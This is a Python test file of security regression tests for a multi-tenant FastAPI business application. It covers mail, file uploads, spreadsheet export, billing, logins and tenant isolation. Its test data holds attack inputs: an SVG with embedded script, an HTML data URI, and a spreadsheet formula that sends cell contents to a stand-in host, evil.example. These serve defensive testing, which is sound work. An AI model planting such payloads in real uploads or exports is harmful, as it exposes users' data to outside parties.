"""What the full review found, held in place: each of these was a way in or a way to be wrong, reproduced first."""
import hashlib
import io
import uuid

import openpyxl
import pytest
from starlette.websockets import WebSocketDisconnect
from fastapi.testclient import TestClient

import main
from app import models
from conftest import as_owner
from test_delete_work_order import book, live_order
from test_subcontract_orders import staff, sign_in, PASSWORD
from test_team import invite as team_invite, set_their_password, sign_in_as


# --- mail ---------------------------------------------------------------------------------------------------------

def test_nobody_can_send_mail_from_the_company_account_through_the_test_endpoint(client):
    res = client.post("/api/send-test-email", json={"to_email": "a@b.co", "subject": "x", "body": "y"})
    assert res.status_code in (404, 405)


def test_outgoing_mail_names_no_stranger(monkeypatch):
    monkeypatch.delenv("FROM_EMAIL", raising=False)
    raw = main.prepare_email_message("to@example.com", "Hi", "Body", "<p>Body</p>", main.default_from_email())
    assert "billing.com" not in raw


# --- files --------------------------------------------------------------------------------------------------------

def test_a_picture_that_is_really_a_page_is_refused_and_one_already_kept_is_never_shown(tenant):
    job = tenant.post("/api/jobs", json={"name": "Probe site"}).json()
    jid = job.get("id") or job["job"]["id"]
    svg = b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
    res = tenant.post("/api/files", files={"file": ("site.jpg", svg, "image/svg+xml")},
                      data={"attached_type": "job", "attached_id": str(jid)})
    assert res.status_code == 400
    # one stored before this check existed
    cid = tenant.get("/api/client/me").json()["id"]
    with main.SessionLocal() as db:
        f = models.DBFile(client_id=cid, job_id=jid, kind="photo", attached_type="job", attached_id=jid,
                          name="old.jpg", content_type="image/svg+xml", size=len(svg), data=svg)
        db.add(f)
        db.commit()
        fid = f.id
    got = tenant.get("/api/files/%d" % fid)
    assert got.headers["content-type"] == "application/octet-stream"
    assert got.headers["content-disposition"].startswith("attachment")
    assert "sandbox" in got.headers["content-security-policy"]


def test_a_real_photo_still_opens_in_the_page(tenant):
    job = tenant.post("/api/jobs", json={"name": "Photo site"}).json()
    jid = job.get("id") or job["job"]["id"]
    res = tenant.post("/api/files", files={"file": ("a.png", b"\x89PNG\r\n\x1a\n" + b"0" * 40, "image/png")},
                      data={"attached_type": "job", "attached_id": str(jid)})
    assert res.status_code == 200, res.text
    got = tenant.get("/api/files/%d" % res.json()["file"]["id"])
    assert got.headers["content-type"] == "image/png" and got.headers["content-disposition"].startswith("inline")


def test_a_contractors_document_must_be_a_pdf_or_a_photo_and_is_never_served_as_a_page(tenant):
    con = tenant.post("/api/wo/contractors", json={"company_name": "Doc Probe Works"}).json()
    key = main.REGISTRATION_DOCUMENTS[0][0]
    bad = tenant.put("/api/wo/contractors/%d" % con["id"], json={
        "company_name": "Doc Probe Works", "document_files": {key: {"name": "x.html", "data": "data:text/html;base64,PHNjcmlwdD4="}}})
    assert bad.status_code == 400
    ok = tenant.put("/api/wo/contractors/%d" % con["id"], json={
        "company_name": "Doc Probe Works", "document_files": {key: {"name": 'a"b.pdf', "data": "data:application/pdf;base64,JVBERi0="}}})
    assert ok.status_code == 200, ok.text
    got = tenant.get("/api/wo/contractors/%d/documents/%s" % (con["id"], key))
    assert got.headers["content-type"] == "application/pdf" and '"b' not in got.headers["content-disposition"].split("filename=")[1][1:]


# --- spreadsheets -------------------------------------------------------------------------------------------------

def test_text_that_starts_with_an_equals_sign_stays_text_in_an_export(tenant):
    tenant.post("/api/wo/contractors", json={"company_name": '=HYPERLINK("http://evil.example/?"&A1,"Click")'})
    got = tenant.get("/api/wo/contractors.xlsx")
    assert got.status_code == 200
    seen = [c for ws in openpyxl.load_workbook(io.BytesIO(got.content)).worksheets for row in ws.iter_rows() for c in row
            if isinstance(c.value, str) and "HYPERLINK" in c.value]
    assert seen and all(c.data_type != "f" for c in seen)


# --- bills --------------------------------------------------------------------------------------------------------

def measure_and_bill(tenant, order, item, qty=1):
    tenant.post("/api/sub-mb/%d/entries" % order["id"], json={"item_id": item, "quantity": qty})
    return tenant.post("/api/sub-bills", json={"order_id": order["id"]})


def test_a_bill_deleted_does_not_stop_the_order_being_billed_again(tenant):
    order = live_order(tenant, pay_advance=False)
    item = book(tenant, order["id"])["lines"][0]["item_id"]
    first = measure_and_bill(tenant, order, item).json()["bill"]
    tenant.post("/api/sub-bills/%d/cancel" % first["id"], json={"comments": "x"})
    second = measure_and_bill(tenant, order, item).json()["bill"]
    tenant.post("/api/sub-bills/%d/cancel" % second["id"], json={"comments": "x"})
    assert tenant.delete("/api/sub-bills/%d" % first["id"]).status_code == 200
    third = measure_and_bill(tenant, order, item)
    assert third.status_code == 200, third.text
    assert third.json()["bill"]["number"] not in (second["number"],)


def test_claimed_before_follows_a_cancelled_earlier_bill(tenant):
    order = live_order(tenant, pay_advance=False)
    item = book(tenant, order["id"])["lines"][0]["item_id"]
    first = measure_and_bill(tenant, order, item).json()["bill"]
    tenant.post("/api/sub-bills/%d/submit" % first["id"], json={})
    tenant.post("/api/sub-bills/%d/certify" % first["id"], json={})
    second = measure_and_bill(tenant, order, item, 2).json()["bill"]
    assert second["previously_billed"] == first["this_bill"]
    tenant.post("/api/sub-bills/%d/cancel" % first["id"], json={"comments": "wrong"})
    sent = tenant.post("/api/sub-bills/%d/submit" % second["id"], json={}).json()["bill"]
    assert sent["previously_billed"] == 0
    assert sent["gross_to_date"] == sent["this_bill"]


def test_staff_cannot_delete_measurements_on_an_order_they_cannot_see(tenant, portal):
    order = live_order(tenant, pay_advance=False)
    item = book(tenant, order["id"])["lines"][0]["item_id"]
    tenant.post("/api/sub-mb/%d/entries" % order["id"], json={"item_id": item, "quantity": 5})
    entry = book(tenant, order["id"])["entries"][0]
    site = staff(tenant, "staff")
    sign_in(portal, site)
    assert portal.delete("/api/sub-mb/entries/%d" % entry["id"]).status_code == 404
    assert len(book(tenant, order["id"])["entries"]) == 1


def test_a_change_sent_twice_with_one_key_is_made_once(tenant):
    order = live_order(tenant, pay_advance=False)
    item = book(tenant, order["id"])["lines"][0]["item_id"]
    url = "/api/sub-mb/%d/entries" % order["id"]
    key = {"Idempotency-Key": uuid.uuid4().hex}
    first = tenant.post(url, json={"item_id": item, "quantity": 3}, headers=key)
    again = tenant.post(url, json={"item_id": item, "quantity": 3}, headers=key)
    assert first.status_code == again.status_code == 200
    assert again.headers.get("idempotent-replay") == "true" and again.json() == first.json()
    assert len(book(tenant, order["id"])["entries"]) == 1
    tenant.post(url, json={"item_id": item, "quantity": 3}, headers={"Idempotency-Key": uuid.uuid4().hex})
    assert len(book(tenant, order["id"])["entries"]) == 2


# --- people -------------------------------------------------------------------------------------------------------

def test_a_removed_team_member_is_out_on_their_next_look_not_only_their_next_change(tenant, portal):
    member, email = team_invite(tenant)
    mid = member.get("member", member).get("id")
    raw = set_their_password(mid)
    assert portal.post("/api/client/reset-password", json={"token": raw, "password": "Colleague123"}).status_code == 200
    assert sign_in_as(portal, email).status_code == 200
    assert portal.get("/api/client/me").status_code == 200
    assert tenant.delete("/api/team/%d" % mid).status_code == 200
    assert portal.get("/api/client/me").status_code == 401
    assert portal.get("/api/invoices").status_code == 401


def test_a_percent_sign_is_not_a_way_into_staff_accounts(tenant, portal):
    client = portal
    emp = staff(tenant, "staff")
    assert client.post("/api/employee/auth/login", json={"email": "%", "password": PASSWORD}).status_code == 401
    assert client.post("/api/employee/auth/login", json={"email": "ra%", "password": PASSWORD}).status_code == 401
    assert client.post("/api/employee/auth/login", json={"email": emp["email"].upper(), "password": PASSWORD}).status_code == 200


def test_staff_passwords_meet_the_same_rule_as_everybody_elses(tenant):
    res = tenant.post("/api/employees", json={"first_name": "Weak", "last_name": "Pass", "email": "weak-%s@example.com" % uuid.uuid4().hex[:6],
                                              "salary": 1000, "password": "1234"})
    assert res.status_code == 400
    emp = staff(tenant, "staff")
    assert tenant.put("/api/employees/%d/set-password" % emp["id"], json={"password": "1234"}).status_code == 400
    assert tenant.post("/api/employees/%d/reset-password" % emp["id"], json={"password": "abcd"}).status_code == 400


def test_a_password_stored_the_old_way_still_works_and_is_stored_the_new_way_after(account, client):
    with main.SessionLocal() as db:
        c = db.query(models.DBClient).filter(models.DBClient.email == account["email"]).first()
        salt = b"s" * 16
        c.password_hash = salt.hex() + ":" + hashlib.pbkdf2_hmac("sha256", account["password"].encode(), salt, 100000).hex()
        db.commit()
        cid = c.id
    assert client.post("/api/client/login", json={"email": account["email"], "password": account["password"]}).status_code == 200
    with main.SessionLocal() as db:
        assert db.query(models.DBClient).get(cid).password_hash.startswith("pbkdf2_sha256$")
    assert client.post("/api/client/login", json={"email": account["email"], "password": account["password"]}).status_code == 200
    assert client.post("/api/client/login", json={"email": account["email"], "password": "Wrong1234"}).status_code == 401


def test_the_platform_password_changed_in_the_panel_is_not_put_back_at_the_next_boot():
    main.ensure_super_admin()
    with main.SessionLocal() as db:
        sa = db.query(models.DBSuperAdmin).first()
        original = sa.password_hash
        sa.password_hash = main.hash_password("ChangedInPanel1")
        db.commit()
    try:
        main.ensure_super_admin()
        with main.SessionLocal() as db:
            assert main.verify_password("ChangedInPanel1", db.query(models.DBSuperAdmin).first().password_hash)
    finally:
        with main.SessionLocal() as db:
            db.query(models.DBSuperAdmin).first().password_hash = original
            db.commit()


# --- other companies ----------------------------------------------------------------------------------------------

def test_one_companys_gmail_is_never_lent_to_another(tenant, second_tenant):
    mine = tenant.get("/api/client/me").json()["id"]
    theirs = second_tenant.get("/api/client/me").json()["id"]
    with main.SessionLocal() as db:
        db.add(models.DBSettings(client_id=mine, key="GOOGLE_REFRESH_TOKEN", value="rt-mine"))
        db.commit()
        assert main.get_stored_refresh_token(db, client_id=mine) == "rt-mine"
        assert main.get_stored_refresh_token(db, client_id=theirs) is None


def test_a_project_of_another_company_cannot_be_named_in_a_request(tenant, second_tenant):
    other = second_tenant.post("/api/jobs", json={"name": "Not yours"}).json()
    other_id = other.get("id") or other["job"]["id"]
    assert tenant.post("/api/estimates", json={"title": "Tender", "job_id": other_id}).status_code == 404
    mine = tenant.post("/api/estimates", json={"title": "Tender"})
    assert mine.status_code == 200, mine.text
    est_id = mine.json().get("id") or mine.json()["estimate"]["id"]
    assert tenant.put("/api/estimates/%d" % est_id, json={"title": "Tender", "job_id": other_id}).status_code == 404


# --- size, rooms ----------------------------------------------------------------------------------------------------

def test_a_login_form_cannot_be_a_gigabyte(client):
    res = client.post("/api/client/login", content=b"x" * 200_000, headers={"Content-Type": "application/json"})
    assert res.status_code == 413


def test_the_meeting_room_is_for_signed_in_people_and_a_place_cannot_be_taken(tenant):
    stranger = TestClient(main.app)
    with pytest.raises(WebSocketDisconnect):
        with stranger.websocket_connect("/ws/meeting/room1?user_id=u1&name=X") as ws:
            ws.receive_json()
    with tenant.websocket_connect("/ws/meeting/room2?user_id=host&name=Host") as first:
        first.receive_json()
        with pytest.raises(WebSocketDisconnect):
            with tenant.websocket_connect("/ws/meeting/room2?user_id=host&name=Impostor") as second:
                second.receive_json()
